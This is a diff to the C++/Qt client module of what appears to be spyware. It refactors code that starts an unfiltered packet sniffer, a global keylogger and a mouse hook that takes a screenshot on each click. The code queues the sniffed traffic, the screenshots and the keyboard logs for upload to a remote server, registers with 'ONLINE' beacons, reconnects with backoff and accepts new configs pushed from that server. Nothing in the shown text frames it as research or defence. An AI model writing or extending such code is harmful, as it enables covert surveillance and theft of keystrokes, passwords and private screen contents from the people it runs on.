@@ -1,16 +1,19 @@
-#include <QDebug>
 #include "client.h"
 
 Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QString _ip, quint16 _destPort):
     QObject(parent),
-    path(defaultPath),
     locPort(_locPort),
+    destPort(_destPort),
     ip(_ip),
-    destPort(_destPort)
+    path(defaultPath),
+    onlineTimer{std::make_unique<QTimer>(this)},
+    config{std::make_unique<Config>()},
+    fileServer{std::make_unique<FileServer>(this, locPort, path)},
+    fileClient{std::make_unique<FileClient>(this, ip, destPort)}
 {    
     //Start sniffer
     QThread* snThread = new QThread();
-    std::string filter = "";//"ip dst net 192.168 and src net 192.168";
+    std::string filter = ""; //"ip dst net 192.168 and src net 192.168" - local network;
     sniffer = std::make_unique<Sniffer>(nullptr, path, filter);
     sniffer->moveToThread(snThread);
     connect(snThread, &QThread::started, sniffer.get(), &Sniffer::start);
@@ -20,16 +23,8 @@ Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QS
 
     //Send sniffer data
     connect(sniffer.get(), &Sniffer::newData, [this](const QString& data){
-        fileClient->enqueueData(Type::STRING, "DATA|" + data);
-        fileClient->connect();
+        fileClient->enqueueDataAndConnect(std::make_unique<data::String>("DATA|" + data));
     });
-
-    //Start modules
-    fileServer = std::make_unique<FileServer>(this, locPort, path);
-    fileClient = std::make_unique<FileClient>(this, ip, destPort);
-    config = std::make_unique<Config>();
-    onlineTimer = std::make_unique<QTimer>(this);
-    fileServer->start();
 
     //Load config
     //Default path ./config.cfg
@@ -39,63 +34,40 @@ Client::Client(QObject* parent, const QString& defaultPath, quint16 _locPort, QS
         saveConfig(*config, path + "/config.cfg");
     }
 
-    //Update client state
+    //Start module and update client state
+    fileServer->start();
     update();
 
-    //Trying to connect to server
+    //Trying connect to server
     getOnline();
 
-    //Connect to receive files and strings
-    connect(fileServer.get(), &FileServer::dataSaved, [this](QString str, QString ip){ this->getFile(str, ip); });
+    //Connect for receiving files and strings
+    connect(fileServer.get(), &FileServer::fileReceived, [this](QString str, QString ip){ this->getFile(str, ip); });
     connect(fileServer.get(), &FileServer::stringReceived, [this](QString str, QString ip){ this->getString(str, ip); });
-
-    //Progress bar
-    //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });
 
     //Make "screens" folder
     QDir dir;
     dir.mkdir(path + "/screens");
 
-    //Connect screenshot module
-    connect(&MouseHook::instance(), &MouseHook::mouseClicked, [this]()
+    //Set path
+    MouseHook::instance().setPath(path);
+    connect(&MouseHook::instance(), &MouseHook::screenSaved,
+    this, [this](QString screenName)
     {
-        //Thread for making screenshots
-        QThread* thread = new QThread(this);
-        MakeScreen* screen = new MakeScreen(0, path + "/screens/", MouseHook::instance().getPrevName());
-        screen->moveToThread(thread);
-
-        connect(thread, &QThread::started, screen, &MakeScreen::makeScreenshot);
-        connect(screen, &MakeScreen::screenSaved, thread, &QThread::quit);
-        connect(thread, &QThread::finished, thread, &QThread::deleteLater);
-        connect(thread, &QThread::finished, screen, &MakeScreen::deleteLater);
-
-        thread->start();
-
-        connect(screen, &MakeScreen::screenSaved,
-        this, [this](QString screenName)
-        {
-            MouseHook::instance().setPrevName(screenName);
-            //Send screenshot
-            fileClient->enqueueData(Type::FILE, path + "/screens/" + screenName);
-            fileClient->connect();
-        });
+        //Send screenshot
+        fileClient->enqueueDataAndConnect(std::make_unique<data::File>(path + "/screens/" + screenName));
     });
 
-    //Set default folder
-    Klog::instance().setPath(path);
-
     //Send keyboard log by timer timeout
+    Klog::instance().setPath(path);
     connect(&Klog::instance(), &Klog::timerIsUp, [this](){
         enqueueLog();
-        if ( ! fileClient->isDataQueueEmpty() )
-            fileClient->connect();
     });
 }
 
 Client::~Client()
 {
-    fileClient->getOffline();
-    qDebug() << "Client deleted.";
+    fileClient->sendAndDisconnect("OFFLINE|" + fileClient->getName());
 }
 
 void Client::update()
@@ -119,14 +91,17 @@ void Client::update()
 void Client::getOnline()
 {
     //Queue string
-    fileClient->enqueueData(Type::STRING, "ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) );
+    fileClient->enqueueDataAndConnect(std::make_unique<data::String>("ONLINE|" + fileClient->getName() + '|' + QString::number(locPort) ));
+
+    connect(fileClient.get(), &FileClient::transmitted, onlineTimer.get(), &QTimer::stop);
     //Start and connect timer
-    onlineTimer->start(2*1000);    //2, 4, 8, 16 ... seconds
+    onlineTimer->start(2*1000);    //2, 4, 8, 16, ... seconds
     connect(onlineTimer.get(), &QTimer::timeout, [this](){
         fileClient->connect();
-        onlineTimer->setInterval(2*onlineTimer->interval());
+        int interval = onlineTimer->interval();
+        if (interval < (10*60*1000)) //10 min
+            onlineTimer->setInterval(2*interval);
     });
-    connect(fileClient.get(), &FileClient::transmitted, onlineTimer.get(), &QTimer::stop);
 }
 
 void Client::getFile(const QString& path, const QString& /* ip */)
@@ -135,7 +110,10 @@ void Client::getFile(const QString& path, const QString& /* ip */)
     QString extension = path.section('.', -1, -1);
     //If config received
     if (extension == "cfg")
+    {
+        qDebug() << "Getting new config";
         getNewConfig(path);
+    }
 }
 
 void Client::getString(const QString &string, const QString& /* ip */)
@@ -153,9 +131,6 @@ void Client::getString(const QString &string, const QString& /* ip */)
 
         if (files & (int)Files::Screen) emit MouseHook::instance().mouseClicked();
         if (files & (int)Files::Log) enqueueLog();
-
-        if (! fileClient->isDataQueueEmpty())
-            fileClient->connect();
     }
 }
 
@@ -200,11 +175,14 @@ void Client::enqueueLog()
     log.close();
     fullLog.close();
 
-    fileClient->enqueueData(Type::FILE, path + "/data_tmp.log");
-
     //Delete temp log when it will be transmitted
-    disconnect(fileClient.get(), &FileClient::transmitted, 0 , 0);
-    connect(fileClient.get(), &FileClient::transmitted, [this](){
+    auto conn = std::make_shared<QMetaObject::Connection>();
+    *conn = QObject::connect(fileClient.get(), &FileClient::transmitted, [this, conn]()
+    {
         QFile::remove(path + "/data_tmp.log");
+        QObject::disconnect(*conn); //disconnect
     });
+
+    //Send log
+    fileClient->enqueueDataAndConnect(std::make_unique<data::File>(path + "/data_tmp.log"));
 }
